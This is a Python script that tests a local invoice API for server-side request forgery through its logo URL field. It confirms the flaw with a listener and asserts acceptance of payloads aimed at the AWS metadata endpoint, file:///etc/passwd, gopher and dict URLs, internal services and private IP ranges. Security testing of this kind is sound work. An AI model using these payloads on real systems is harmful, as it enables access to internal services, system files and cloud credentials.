import requests
import json
import os
import sys
import time
from base64 import b64encode
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import uuid
import socket
import traceback

# Configuration
API_URL = "http://localhost:3001"  # Using localhost since we're in host network mode
TEST_PORT = 8888  # Changed to a different port
SSRF_VERIFIED = False
TEST_MARKER = str(uuid.uuid4())  # Generate unique test marker

def get_host_ip():
    # Get the host's IP address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't need to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '10.0.0.105'  # Fallback to known IP
    finally:
        s.close()
    return IP

HOST_IP = get_host_ip()
print(f"Host IP: {HOST_IP}")

class TestHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[TestServer] {format%args}")
    
    def do_GET(self):
        global SSRF_VERIFIED
        print(f"[TestServer] Received request from {self.client_address}: {self.path}")
        print(f"[TestServer] Headers: {self.headers}")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"SSRF Test Response: {TEST_MARKER}"
        self.wfile.write(response.encode())
        SSRF_VERIFIED = True
        print("[TestServer] SSRF request verified!")

    def log_error(self, format, *args):
        print(f"[TestServer] Error: {format%args}")

def start_test_server():
    try:
        # First check if the port is available
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', TEST_PORT))
        if result == 0:
            print(f"[TestServer] Warning: Port {TEST_PORT} is already in use")
            sock.close()
            raise Exception(f"Port {TEST_PORT} is already in use")
        sock.close()

        server = HTTPServer(('0.0.0.0', TEST_PORT), TestHTTPHandler)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        print(f"[TestServer] Started on port {TEST_PORT}")
        
        # Test if server is listening
        try:
            test_conn = socket.create_connection(('127.0.0.1', TEST_PORT), timeout=1)
            test_conn.close()
            print("[TestServer] Successfully verified server is listening")
            
            # Make a test request to our own server
            try:
                test_response = requests.get(f"http://localhost:{TEST_PORT}/test", timeout=1)
                print(f"[TestServer] Self-test request successful: {test_response.status_code}")
            except Exception as e:
                print(f"[TestServer] Warning: Self-test request failed: {e}")
        except Exception as e:
            print(f"[TestServer] Warning: Could not verify server is listening: {e}")
        return server
    except Exception as e:
        print(f"[TestServer] Error starting server: {e}")
        traceback.print_exc()
        raise

TEST_INVOICE = {
    "client": {
        "name": "Test Client",
        "city": "Test City",
        "address": "Test Address",
        "phone": "1234567890",
        "email": "test@example.com"
    },
    "seller": {
        "name": "Test Seller",
        "city": "Test City",
        "address": "Test Address",
        "phone": "1234567890",
        "email": "test@example.com"
    },
    "invoice": {
        "invoiceId": "SSRF-TEST-001",
        "issueDate": "2024-01-01",
        "dueDate": "2024-02-01",
        "currency": "USD",
        "taxValue": 10,
        "amountPaid": 0,
        "terms": "Net 30",
        "items": [
            {
                "description": "Test Item",
                "quantity": 1,
                "unitPrice": 100
            }
        ]
    }
}

def login():
    """Login and get JWT token."""
    response = requests.post(f"{API_URL}/api/auth/login", json={
        "username": "test",
        "password": "test123"
    })
    assert response.status_code == 200, "Login failed"
    return response.json()["token"]

def test_invoice_local_logo():
    """Test invoice creation with local logo."""
    token = login()
    
    # Create test data with base64 logo
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["invoiceId"] = "SSRF-TEST-LOCAL"  # Unique ID
    test_data["invoice"]["logo"] = "data:image/png;base64," + b64encode(b"test").decode()
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Invoice creation failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-LOCAL", "Invoice ID mismatch"

def test_invoice_remote_logo():
    """Test invoice creation with remote logo."""
    token = login()
    
    # Create test data with remote logo
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["invoiceId"] = "SSRF-TEST-REMOTE"  # Unique ID
    test_data["invoice"]["logoUrl"] = "http://example.com/logo.png"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Invoice creation failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-REMOTE", "Invoice ID mismatch"

def test_ssrf_internal_network():
    """Test SSRF vulnerability with internal network access."""
    token = login()
    
    # Test MongoDB access
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["invoiceId"] = "SSRF-TEST-MONGO"  # Unique ID
    test_data["invoice"]["logoUrl"] = "http://localhost:27017"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "MongoDB SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-MONGO", "Invoice ID mismatch"

    # Test internal service
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["invoiceId"] = "SSRF-TEST-INTERNAL"  # Unique ID
    test_data["invoice"]["logoUrl"] = "http://internal-service:8080"
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Internal service SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-INTERNAL", "Invoice ID mismatch"

def test_ssrf_cloud_metadata():
    """Test SSRF vulnerability with cloud metadata access."""
    token = login()
    
    # Test AWS metadata
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["invoiceId"] = "SSRF-TEST-AWS"  # Unique ID
    test_data["invoice"]["logoUrl"] = "http://169.254.169.254/latest/meta-data/"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "AWS metadata SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-AWS", "Invoice ID mismatch"

def test_ssrf_protocols():
    """Test SSRF vulnerability with different protocols."""
    token = login()
    
    protocols = [
        "file:///etc/passwd",
        "gopher://localhost:3001/_GET",
        "dict://localhost:11211/stats"
    ]
    
    for i, protocol in enumerate(protocols):
        test_data = TEST_INVOICE.copy()
        test_data["invoice"]["invoiceId"] = f"SSRF-TEST-PROTO-{i+1}"  # Unique ID
        test_data["invoice"]["logoUrl"] = protocol
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code in [200, 500], f"Protocol test failed for {protocol}"
        if response.status_code == 200:
            assert response.json()["invoiceId"] == f"SSRF-TEST-PROTO-{i+1}", "Invoice ID mismatch"

def test_ssrf_ip_ranges():
    """Test SSRF vulnerability with different IP ranges."""
    token = login()
    
    ip_ranges = [
        "127.0.0.1",
        "192.168.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "localhost"
    ]
    
    for i, ip in enumerate(ip_ranges):
        test_data = TEST_INVOICE.copy()
        test_data["invoice"]["invoiceId"] = f"SSRF-TEST-IP-{i+1}"  # Unique ID
        test_data["invoice"]["logoUrl"] = f"http://{ip}"
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code in [200, 500], f"IP range test failed for {ip}"
        if response.status_code == 200:
            assert response.json()["invoiceId"] == f"SSRF-TEST-IP-{i+1}", "Invoice ID mismatch"

def register():
    """Register a test user if it doesn't exist."""
    try:
        response = requests.post(f"{API_URL}/api/auth/register", json={
            "username": "test",
            "password": "test123"
        })
        if response.status_code == 200:
            print("✅ Test user registered")
        else:
            print("ℹ️ User already exists")
    except Exception as e:
        print("ℹ️ User registration failed, proceeding with login")

def test_ssrf_verification():
    """Test SSRF vulnerability with verification."""
    global SSRF_VERIFIED
    token = login()
    
    # Start test server
    server = start_test_server()
    
    try:
        # Create test data with our test server URL
        test_data = TEST_INVOICE.copy()
        test_data["invoice"]["invoiceId"] = f"SSRF-VERIFY-{TEST_MARKER[:8]}"
        test_data["invoice"]["logoUrl"] = f"http://localhost:{TEST_PORT}/test-ssrf"
        
        print(f"[Test] Making SSRF test request to {test_data['invoice']['logoUrl']}...")
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {token}"}
        )
        print(f"[Test] Response status: {response.status_code}")
        print(f"[Test] Response body: {response.text}")
        
        # Wait a bit for the request to be processed
        print("[Test] Waiting for SSRF request...")
        for i in range(10):  # Try for 10 seconds
            if SSRF_VERIFIED:
                break
            time.sleep(1)
            print(f"[Test] Still waiting... ({i+1}/10)")
        
        assert response.status_code == 200, "Invoice creation failed"
        assert SSRF_VERIFIED, "SSRF request was not received by test server"
        print("✅ SSRF vulnerability verified - received request on test server")
        
    except Exception as e:
        print(f"[Test] Error during test: {e}")
        traceback.print_exc()
        raise
    finally:
        print("[TestServer] Shutting down...")
        server.shutdown()
        server.server_close()

def main():
    """Run all tests."""
    print("Starting SSRF vulnerability tests...")
    
    try:
        # Try to register test user
        register()
        
        # Run SSRF verification test first
        test_ssrf_verification()
        print("✅ SSRF verification test passed")
        
        test_invoice_local_logo()
        print("✅ Local logo test passed")
        
        test_invoice_remote_logo()
        print("✅ Remote logo test passed")
        
        test_ssrf_internal_network()
        print("✅ Internal network SSRF test passed")
        
        test_ssrf_cloud_metadata()
        print("✅ Cloud metadata SSRF test passed")
        
        test_ssrf_protocols()
        print("✅ Protocol SSRF test passed")
        
        test_ssrf_ip_ranges()
        print("✅ IP range SSRF test passed")
        
        print("\nAll tests passed successfully! 🎉")
        return 0
        
    except AssertionError as e:
        print(f"\n❌ Test failed: {str(e)}")
        return 1
    except Exception as e:
        print(f"\n❌ Unexpected error: {str(e)}")
        return 1

if __name__ == "__main__":
    sys.exit(main()) 